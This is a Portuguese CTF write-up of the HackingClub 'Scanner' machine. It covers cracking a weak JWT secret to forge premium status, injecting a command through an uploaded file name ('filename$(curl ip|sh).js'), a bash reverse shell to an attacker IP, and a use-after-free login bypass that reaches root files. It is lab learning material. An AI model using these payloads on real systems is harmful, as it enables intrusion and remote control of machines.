---
layout: post
title:  "Scanner"
date:   2025-03-22 18:48:00 -0300
tags: hackingclub
category: ctf
level: medium
description: a machine about JWT Weak secret, Command injection & Use-After-Free exploitation.
---

# introdução

Este artigo apresenta a exploração bem-sucedida de uma **injeção de comando** por meio da análise de nome de arquivos no Semgrep, **bypass de filtros de assinatura** através da modificação de tokens JWT e **engenharia reversa** de um binário para detectar e explorar uma vulnerabilidade de *Use After Free (UAF)* para escalonamento de privilégios.

A exploração foi realizada em uma máquina de CTF da plataforma [hackingclub](https://hackingclub.com).

# reconhecimento

Para iniciar o processo de exploração, é essencial primeiro entender o ambiente alvo. Começamos usando o Nmap para escanear o IP da máquina e identificar quais portas estão abertas.

```bash
> nmap -sV 172.16.6.67
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 18:58 -03
Nmap scan report for 172.16.6.67
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 25.28 seconds
```

As portas 22 e 80 estavam abertas, indicando a presença de um serviço SSH e uma aplicação web.

Ao acessar a aplicação web, foi identificado que se tratava de um scanner de arquivos JavaScript. Além disso, havia botões de login e cadastro, sugerindo a presença de um sistema de autenticação de usuários.

![primeiro acesso à aplicação]({{ "/assets/img/hacking_club_scanner/app.png" | relative_url }})

Ao tentar escanear um arquivo, a aplicação redirecionava para uma tela de assinatura.

![tela de assinatura]({{ "/assets/img/hacking_club_scanner/premium.png" | relative_url }})

Para avançar, o fluxo de cadastro e login foi testado para explorar como o status premium poderia ser obtido. Foi criada uma nova conta com o e-mail `teste@teste.com` e a senha `123456`. Após o login bem-sucedido, foi recebido um token JWT como resposta:

![login]({{ "/assets/img/hacking_club_scanner/login.png" | relative_url }})

# forjando o status premium

O token foi analisado usando um depurador de JWT para identificar possíveis informações úteis gerenciadas pela aplicação.

![jwt-debug]({{ "/assets/img/hacking_club_scanner/jwt-premium.png" | relative_url }})

Bingo! Descobrimos que o status de assinatura da plataforma é controlado por uma flag dentro do JWT. O próximo passo foi descobrir como alterar esse valor sem saber o segredo do token. Como abordagem padrão, foi tentado um ataque de força bruta contra o JWT usando uma wordlist conhecida. Se o segredo for fraco, é possível modificar o payload e re-assinar o token mantendo-o válido.

Usando o `jwt-cracker` com a wordlist `seclists/Passwords/darkweb2017-top10000.txt`, o segredo foi encontrado com sucesso:

```bash
> jwt-cracker <token> -d /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
SECRET FOUND: 1a2b3c4d
Time taken (sec): 0.042
Total attempts: 9999
```

Agora que temos o segredo, se tornar premium na plataforma sem pagar se torna trivial. No jwt.io, basta modificar a flag `"premium"` para `"true"` e inserir o segredo identificado para re-assinar o token.

![token forjado]({{ "/assets/img/hacking_club_scanner/forged-token.png" | relative_url }})

Somos premium! \:D

# escaneando nosso primeiro arquivo

Após se tornar premium modificando o token JWT, foi feito o upload de um arquivo JS aleatório para analisar como o processo de escaneamento funciona. Ao enviar o arquivo, o seguinte resultado foi retornado pela ferramenta Semgrep:

![resposta do semgrep]({{ "/assets/img/hacking_club_scanner/scan-response.png" | relative_url }})

O Semgrep é uma ferramenta de Análise Estática de Segurança (SAST) que pode ser executada via linha de comando. Para escanear um arquivo, basta executar:

```bash
> semgrep scan caminho/para/o/arquivo
```

A aplicação provavelmente executa algo similar a:

```javascript
app.post('/api/v1/upload', (req, res) => {
    // SALVA O ARQUIVO ANTES DO SCAN
    res.send(exec('semgrep scan $(req.body.filename)', (err, stdout, stderr) => {
      return stdout;
    }));
});
```

Se a aplicação funcionar como esperado, podemos explorar uma possível vulnerabilidade no processo de escaneamento de arquivos.

Notamos que a aplicação só permite arquivos com extensão `.js`, validando apenas os três últimos caracteres. Com isso, é possível criar um payload como: `filename$(comando).js`

Para verificar se o payload está funcionando, montamos um servidor para receber requisições da aplicação. Assim, confirmamos se a injeção de comando foi bem-sucedida.

O payload seria: `filename$(curl meuip).js`

Para receber a requisição, podemos subir um servidor simples em Python.

![iniciando servidor]({{ "/assets/img/hacking_club_scanner/initserver.png" | relative_url }})

Ao executar o comando, o servidor recebeu a seguinte requisição:

![conexão recebida]({{ "/assets/img/hacking_club_scanner/recvd_connection.png" | relative_url }})

Pronto. A injeção de comando foi validada com sucesso! Agora, o objetivo é obter acesso ao servidor via reverse shell. Para isso, criamos um arquivo `index.html` com um shell reverso em bash e hospedamos no servidor Python.

Conteúdo de `index.html`:

```javascript
/bin/bash -c 'sh -i >& /dev/tcp/10.0.20.223/4444 0>&1'
```

Ao fazer uma requisição ao servidor, o conteúdo do `index.html` será executado. O payload necessário para isso é:

```bash
filename$(curl ip|sh).js
```

Após o envio, conseguimos abrir o shell reverso:

![shell recebido]({{ "/assets/img/hacking_club_scanner/recv_shell.png" | relative_url }})

O próximo passo foi investigar o servidor brevemente e capturar a primeira flag, localizada em `/home/svc_web/user.txt`.

![primeira flag]({{ "/assets/img/hacking_club_scanner/first_flag.png" | relative_url }})

# escalonamento de privilégios

Após realizar o reconhecimento inicial no servidor, não foram encontrados vetores óbvios para escalonamento de privilégios: nenhum binário com capabilities mal configuradas, nenhum SUID, e não temos a senha do usuário `svc_web` para usar sudo.

Contudo, ao listar os processos root em execução, encontramos um *socket* aberto na porta 9717, associado a um binário localizado em `/opt/secure_vault`:

![secure_vault via socat]({{ "/assets/img/hacking_club_scanner/socat-secure-vault.png" | relative_url }})

Conectando na porta 9717, vimos que é necessário fazer login.

![tela de login vault]({{ "/assets/img/hacking_club_scanner/secure_vault_login.png" | relative_url }})

Precisamos analisar o binário para entender como contornar o login. O arquivo foi baixado via `netcat`.

No servidor:

```bash
> nc -lvp 8293 < /opt/secure_vault
```

Na máquina local:

```bash
> nc ip_do_servidor 8293 > secure_vault
```

Rodamos o comando `strings` no binário, buscando senhas embutidas.

![strings]({{ "/assets/img/hacking_club_scanner/strings.png" | relative_url }})

Nada útil. Apenas termos como “admin” e “guest”. Nenhuma dessas combinações funcionou.

Hora de abrir no GHidra.

Ao abrir o binário no Ghidra, identificamos que o programa exibe o menu de login e chama uma função `auth`:

![main do vault]({{ "/assets/img/hacking_club_scanner/secure_vault_main.png" | relative_url }})

Analisando a função `auth`, vimos que o usuário “guest” **não precisa de senha** para acessar o vault.

![auth no ghidra]({{ "/assets/img/hacking_club_scanner/secure_vault_auth_function.png" | relative_url }})

Após autenticar, o programa exibe o `main_menu` com opções de criar, ler, excluir e sair do vault.

Descobrimos que a variável `local_30` guarda o caminho `/root/secure_vault/vaults/(usuário)`, usado para listar os conteúdos do vault. Para o usuário "guest", isso seria `/root/secure_vault/vaults/guest`.

![uso de local_30]({{ "/assets/img/hacking_club_scanner/local_30_usage.png" | relative_url }})

Ao investigar a função de logout, notamos que ela libera a memória de `local_30` com `free`, e logo depois aloca memória para `local_50`, que guarda o nome do usuário. Ambas acabam usando o mesmo endereço de memória.

![use-after-free]({{ "/assets/img/hacking_club_scanner/uaf.png" | relative_url }})

Com isso, foi possível seguir os passos:

1. Fazer login como "guest".
2. Fazer logout.
3. Fazer login novamente com o nome de usuário `/root` e qualquer senha.
4. A variável `local_30` agora tem valor `/root`, permitindo leitura e escrita no diretório raiz.

Seguindo esses passos, foi possível capturar a flag de root.

Basicamente, o binário analisado era vulnerável a uma condição de *Use-After-Free*. Durante o logout, a memória usada por `local_30` era liberada e logo reutilizada por `local_50`, permitindo alterar o caminho usado pelo programa para acessar os vaults — e, assim, ler o diretório raiz do servidor.

Com isso, finalizamos o desafio Scanner! \:D